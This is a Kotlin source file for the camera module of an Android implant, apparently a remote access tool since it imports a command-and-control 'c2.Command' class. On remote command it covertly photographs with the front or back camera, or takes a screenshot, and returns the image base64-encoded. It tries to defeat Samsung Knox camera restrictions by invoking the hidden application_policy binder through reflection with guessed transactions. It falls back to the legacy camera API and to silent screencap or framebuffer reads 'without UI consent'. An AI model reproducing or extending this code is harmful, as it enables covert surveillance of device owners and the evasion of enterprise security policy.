package org.synapse.core.modules

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Binder
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Parcel
import android.util.Base64
import android.util.Log
import android.view.Surface
import org.synapse.core.c2.Command
import org.synapse.core.core.SynapseResponse
import java.io.ByteArrayOutputStream
import java.io.File
import java.lang.reflect.Method
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException
import kotlin.coroutines.suspendCoroutine

object CameraModule {

    private const val TAG = "Synapse.Camera"
    private const val CAPTURE_TIMEOUT_SEC = 8L
    private const val SCREENSHOT_TIMEOUT_SEC = 8L

    /**
     * Primary camera capture action.
     * Tries multiple approaches in order:
     *   1. Knox IApplicationPolicy binder — whitelist our app for camera
     *   2. Camera2 front camera (ID 1) — may bypass Knox back-camera block
     *   3. Camera2 back camera (ID 0) — standard approach
     *   4. Camera1 API (android.hardware.Camera) — older API, may bypass Knox
     *   5. Screenshot fallback
     */
    suspend fun capture(context: Context, cmd: Command): SynapseResponse {
        // ── Step 0: Try Knox IApplicationPolicy to whitelist camera ──
        tryKnoxCameraWhitelist(context)

        // ── Try Camera2 front camera first (bypasses Knox back-camera block) ──
        val frontResult = tryCaptureWithCamera2(context, facingFront = true)
        if (frontResult != null) return frontResult

        // ── Try Camera2 back camera ──
        val backResult = tryCaptureWithCamera2(context, facingFront = false)
        if (backResult != null) return backResult

        // ── Try Camera1 API (android.hardware.Camera) ──
        val camera1Result = tryCaptureWithCamera1()
        if (camera1Result != null) return camera1Result

        Log.w(TAG, "All camera approaches failed — attempting screenshot fallback")
        // ── Fallback: screenshot ──
        return takeScreenshot(context)
    }

    /**
     * Standalone screenshot action (no camera permission needed).
     */
    suspend fun screenshot(context: Context, cmd: Command): SynapseResponse {
        return takeScreenshot(context)
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Knox IApplicationPolicy — whitelist our app for camera access
    // ═══════════════════════════════════════════════════════════════════════════

    private fun tryKnoxCameraWhitelist(context: Context) {
        try {
            val pkgName = context.packageName
            val uid = android.os.Process.myUid()

            // Get application_policy binder
            val smClass = Class.forName("android.os.ServiceManager")
            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
            getService.isAccessible = true
            val binder = getService.invoke(null, "application_policy") as? IBinder ?: return

            Log.d(TAG, "Knox application_policy binder found, attempting camera whitelist")

            val descriptors = listOf(
                "com.samsung.android.knox.application.IApplicationPolicy",
                "com.samsung.android.knox.IApplicationPolicy",
            )

            // Try to find stub class and get transaction codes
            val stubClasses = listOf(
                "com.samsung.android.knox.application.IApplicationPolicy\$Stub",
                "com.samsung.android.knox.IApplicationPolicy\$Stub",
            )
            var txCodes: Map<String, Int> = emptyMap()
            for (stubClass in stubClasses) {
                try {
                    val stub = Class.forName(stubClass)
                    txCodes = stub.declaredFields
                        .filter { it.name.startsWith("TRANSACTION_") }
                        .associate { field ->
                            field.isAccessible = true
                            field.name to field.getInt(null)
                        }
                    if (txCodes.isNotEmpty()) break
                } catch (_: Exception) {}
            }

            // Look for camera-related transaction codes
            val cameraTx = txCodes.filterKeys { k ->
                k.contains("CAMERA", ignoreCase = true) ||
                k.contains("DISABLE", ignoreCase = true) ||
                k.contains("ALLOW", ignoreCase = true) ||
                k.contains("SET_CAMERA", ignoreCase = true) ||
                k.contains("SET_PERMISSION", ignoreCase = true) ||
                k.contains("SET_APPLICATION", ignoreCase = true)
            }

            for (desc in descriptors) {
                for ((txName, txCode) in cameraTx.ifEmpty { mapOf("TX_FALLBACK_1" to 1, "TX_FALLBACK_2" to 2) }) {
                    val data = Parcel.obtain(); val reply = Parcel.obtain()
                    try {
                        data.writeInterfaceToken(desc)
                        // Format: setApplicationState(packageName, disableCamera=false)
                        data.writeString(pkgName)
                        data.writeInt(1) // enabled = true
                        data.writeInt(0) // camera disabled = false

                        val token = Binder.clearCallingIdentity()
                        try {
                            val ok = binder.transact(txCode, data, reply, 0)
                            if (ok) {
                                reply.setDataPosition(0)
                                try { reply.readException() } catch (_: Exception) {}
                                val rc = try { reply.readInt() } catch (_: Exception) { -999 }
                                Log.d(TAG, "Knox camera whitelist $txName tx=$txCode rc=$rc")
                            }
                        } catch (e: Exception) {
                            Log.d(TAG, "Knox camera whitelist tx error: ${e.message}")
                        } finally {
                            Binder.restoreCallingIdentity(token)
                        }
                    } catch (_: Exception) {
                    } finally {
                        data.recycle(); reply.recycle()
                    }
                }
            }
            Log.d(TAG, "Knox camera whitelist attempts complete")
        } catch (e: Exception) {
            Log.w(TAG, "Knox camera whitelist failed: ${e.message}")
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Camera2 — with facing direction parameter
    // ═══════════════════════════════════════════════════════════════════════════

    private suspend fun tryCaptureWithCamera2(context: Context, facingFront: Boolean): SynapseResponse? {
        return try {
            captureInternal(context, facingFront)
        } catch (e: Exception) {
            Log.w(TAG, "Camera2 ${if (facingFront) "front" else "back"} capture exception: ${e.message}")
            null
        }
    }

    private suspend fun captureInternal(context: Context, facingFront: Boolean): SynapseResponse? {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

        val targetFacing = if (facingFront) CameraCharacteristics.LENS_FACING_FRONT
                           else CameraCharacteristics.LENS_FACING_BACK

        val cameraId: String = try {
            cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == targetFacing
            } ?: run {
                // If preferred facing not available, take any camera
                if (facingFront) return null  // Don't fall back to back when we want front
                cameraManager.cameraIdList.firstOrNull()
            } ?: return null
        } catch (e: CameraAccessException) {
            Log.w(TAG, "Camera access exception listing cameras: ${e.message}")
            return null
        }

        val characteristics = cameraManager.getCameraCharacteristics(cameraId)
        val size = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            ?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
        val width = size?.width ?: 1920
        val height = size?.height ?: 1080

        Log.d(TAG, "Camera2: opening camera $cameraId (${if (facingFront) "front" else "back"}) ${width}x${height}")

        val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)

        val handlerThread = HandlerThread("SynapseCamera").apply { start() }
        val handler = Handler(handlerThread.looper)

        val device: CameraDevice = try {
            suspendCoroutine { cont ->
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(cam: CameraDevice) = cont.resume(cam)
                    override fun onDisconnected(cam: CameraDevice) { cam.close() }
                    override fun onError(cam: CameraDevice, err: Int) {
                        cam.close()
                        cont.resumeWithException(CameraAccessException(err, "open failed: $err"))
                    }
                }, handler)
            }
        } catch (e: Exception) {
            imageReader.close()
            handlerThread.quitSafely()
            Log.w(TAG, "Camera open failed (likely Knox): ${e.message}")
            return null
        }

        try {
            val jpeg = AtomicReference<ByteArray>()
            val latch = CountDownLatch(1)

            imageReader.setOnImageAvailableListener({ reader ->
                val img = reader.acquireLatestImage()
                if (img != null) {
                    try {
                        val buf = img.planes[0].buffer
                        val bytes = ByteArray(buf.remaining())
                        buf.get(bytes)
                        jpeg.set(bytes)
                    } finally { img.close() }
                }
                latch.countDown()
            }, null)

            val sessionOpened = suspendCoroutine<CameraCaptureSession> { cont ->
                device.createCaptureSession(listOf(imageReader.surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) = cont.resume(s)
                        override fun onConfigureFailed(s: CameraCaptureSession) {
                            cont.resumeWithException(RuntimeException("configure failed"))
                        }
                    }, null)
            }

            val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageReader.surface)
                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                set(CaptureRequest.JPEG_ORIENTATION, 0)
            }

            sessionOpened.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                override fun onCaptureFailed(s: CameraCaptureSession, r: CaptureRequest, f: CaptureFailure) {
                    latch.countDown()
                }
            }, null)

            val ok = latch.await(CAPTURE_TIMEOUT_SEC, TimeUnit.SECONDS)
            sessionOpened.close()

            val bytes = jpeg.get()
            return if (bytes != null && bytes.isNotEmpty()) {
                SynapseResponse.CameraResponse(
                    image_base64 = Base64.encodeToString(bytes, Base64.NO_WRAP),
                    width = width, height = height, format = "JPEG",
                    size_bytes = bytes.size.toLong()
                )
            } else {
                null
            }
        } catch (e: Exception) {
            Log.w(TAG, "Camera2 session/capture error: ${e.message}")
            return null
        } finally {
            device.close()
            imageReader.close()
            handlerThread.quitSafely()
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Camera1 API (android.hardware.Camera) — older API, may bypass Knox
    // ═══════════════════════════════════════════════════════════════════════════

    private fun tryCaptureWithCamera1(): SynapseResponse? {
        try {
            val cameraClass = Class.forName("android.hardware.Camera")
            val openMethod = cameraClass.getMethod("open", Int::class.java)
            val getParametersMethod = cameraClass.getMethod("getParameters")
            val setPreviewTextureMethod = try {
                cameraClass.getMethod("setPreviewTexture", SurfaceTexture::class.java)
            } catch (_: Exception) { null }
            val startPreviewMethod = cameraClass.getMethod("startPreview")
            val takePictureMethod = cameraClass.getMethod("takePicture",
                Class.forName("android.hardware.Camera\$ShutterCallback"),
                Class.forName("android.hardware.Camera\$PictureCallback"),
                Class.forName("android.hardware.Camera\$PictureCallback"),
                Class.forName("android.hardware.Camera\$PictureCallback"))
            val stopPreviewMethod = cameraClass.getMethod("stopPreview")
            val releaseMethod = cameraClass.getMethod("release")

            // Try front camera (1) first, then back (0)
            for (camId in listOf(1, 0)) {
                var camera: Any? = null
                try {
                    camera = openMethod.invoke(null, camId)
                    if (camera == null) continue

                    Log.d(TAG, "Camera1: opened camera $camId")

                    // Set up a SurfaceTexture for preview (required for takePicture)
                    val st = SurfaceTexture(0)
                    if (setPreviewTextureMethod != null) {
                        setPreviewTextureMethod.invoke(camera, st)
                    }

                    // Get picture size
                    val params = getParametersMethod.invoke(camera)
                    val getPictureSize = params?.javaClass?.getMethod("getPictureSize")
                    val picSize = getPictureSize?.invoke(params)
                    val width = picSize?.javaClass?.getField("width")?.getInt(picSize) ?: 1920
                    val height = picSize?.javaClass?.getField("height")?.getInt(picSize) ?: 1080

                    startPreviewMethod.invoke(camera)

                    val jpegRef = AtomicReference<ByteArray>()
                    val latch = CountDownLatch(1)

                    // Create PictureCallback via dynamic proxy or reflection
                    val pictureCallback = object : Any() {
                        @Suppress("unused")
                        fun onPictureTaken(data: ByteArray?, camera: Any?) {
                            jpegRef.set(data)
                            latch.countDown()
                        }
                    }

                    // Use reflection to create a Camera.PictureCallback
                    val picCbClass = Class.forName("android.hardware.Camera\$PictureCallback")
                    val handler = java.lang.reflect.Proxy.newProxyInstance(
                        picCbClass.classLoader, arrayOf(picCbClass)
                    ) { _, method, args ->
                        if (method.name == "onPictureTaken") {
                            val data = args[0] as? ByteArray
                            jpegRef.set(data)
                            latch.countDown()
                        }
                        null
                    }

                    val shutterCbClass = Class.forName("android.hardware.Camera\$ShutterCallback")
                    val shutterCb = java.lang.reflect.Proxy.newProxyInstance(
                        shutterCbClass.classLoader, arrayOf(shutterCbClass)
                    ) { _, _, _ -> null }

                    takePictureMethod.invoke(camera, shutterCb, null, null, handler)

                    val ok = latch.await(CAPTURE_TIMEOUT_SEC, TimeUnit.SECONDS)
                    val bytes = jpegRef.get()

                    stopPreviewMethod.invoke(camera)
                    releaseMethod.invoke(camera)

                    if (bytes != null && bytes.isNotEmpty()) {
                        // Check if it's a valid JPEG
                        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        val outStream = ByteArrayOutputStream()
                        val actualWidth: Int
                        val actualHeight: Int
                        if (bitmap != null) {
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, outStream)
                            actualWidth = bitmap.width
                            actualHeight = bitmap.height
                            bitmap.recycle()
                        } else {
                            outStream.write(bytes)
                            actualWidth = width
                            actualHeight = height
                        }
                        val jpegBytes = outStream.toByteArray()
                        Log.d(TAG, "Camera1: captured ${jpegBytes.size} bytes from camera $camId")
                        return SynapseResponse.CameraResponse(
                            image_base64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP),
                            width = actualWidth, height = actualHeight, format = "JPEG",
                            size_bytes = jpegBytes.size.toLong()
                        )
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Camera1 cam $camId failed: ${e.message}")
                    try { releaseMethod.invoke(camera) } catch (_: Exception) {}
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Camera1 API not available: ${e.message}")
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Screenshot: shell screencap (no permission / UI consent needed)
    // ═══════════════════════════════════════════════════════════════════════════

    private fun takeScreenshot(context: Context): SynapseResponse {
        // Method 1: shell screencap command (most reliable, no UI)
        try {
            val result = captureViaShell()
            if (result != null) return result
        } catch (e: Exception) {
            Log.w(TAG, "Shell screencap failed: ${e.message}")
        }

        // Method 2: try reading raw framebuffer
        try {
            val result = captureViaFramebuffer()
            if (result != null) return result
        } catch (e: Exception) {
            Log.w(TAG, "Framebuffer capture failed: ${e.message}")
        }

        return SynapseResponse.ErrorResponse("screenshot:all_methods_failed", "camera")
    }

    private fun captureViaShell(): SynapseResponse? {
        val start = System.currentTimeMillis()
        val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p"))
        val bytes = process.inputStream.readBytes()
        val exitCode = process.waitFor()

        if (exitCode != 0 || bytes.isEmpty()) {
            Log.w(TAG, "screencap exited with $exitCode, ${bytes.size} bytes")
            return null
        }

        val (width, height) = parsePngDimensions(bytes)
        val elapsed = System.currentTimeMillis() - start
        Log.d(TAG, "Shell screencap: ${bytes.size} bytes, ${width}x${height}, ${elapsed}ms")

        return SynapseResponse.ScreenshotResponse(
            image_base64 = Base64.encodeToString(bytes, Base64.NO_WRAP),
            width = width,
            height = height,
            format = "PNG",
            size_bytes = bytes.size.toLong()
        )
    }

    private fun captureViaFramebuffer(): SynapseResponse? {
        val fbPaths = listOf("/dev/graphics/fb0", "/dev/fb0")
        for (fbPath in fbPaths) {
            try {
                val fbFile = java.io.File(fbPath)
                if (!fbFile.exists() || !fbFile.canRead()) continue

                val headerBytes = fbFile.inputStream().use { it.readBytes() }
                Log.d(TAG, "fb0 raw read: ${headerBytes.size} bytes from $fbPath")

                return SynapseResponse.ScreenshotResponse(
                    image_base64 = Base64.encodeToString(headerBytes, Base64.NO_WRAP),
                    width = 0,
                    height = 0,
                    format = "RAW_FB0",
                    size_bytes = headerBytes.size.toLong()
                )
            } catch (e: Exception) {
                Log.w(TAG, "Framebuffer $fbPath failed: ${e.message}")
            }
        }
        return null
    }

    private fun parsePngDimensions(bytes: ByteArray): Pair<Int, Int> {
        if (bytes.size < 24) return Pair(0, 0)
        try {
            val width = ((bytes[16].toInt() and 0xFF) shl 24) or
                        ((bytes[17].toInt() and 0xFF) shl 16) or
                        ((bytes[18].toInt() and 0xFF) shl 8) or
                        (bytes[19].toInt() and 0xFF)
            val height = ((bytes[20].toInt() and 0xFF) shl 24) or
                         ((bytes[21].toInt() and 0xFF) shl 16) or
                         ((bytes[22].toInt() and 0xFF) shl 8) or
                         (bytes[23].toInt() and 0xFF)
            return Pair(width, height)
        } catch (e: Exception) {
            return Pair(0, 0)
        }
    }
}
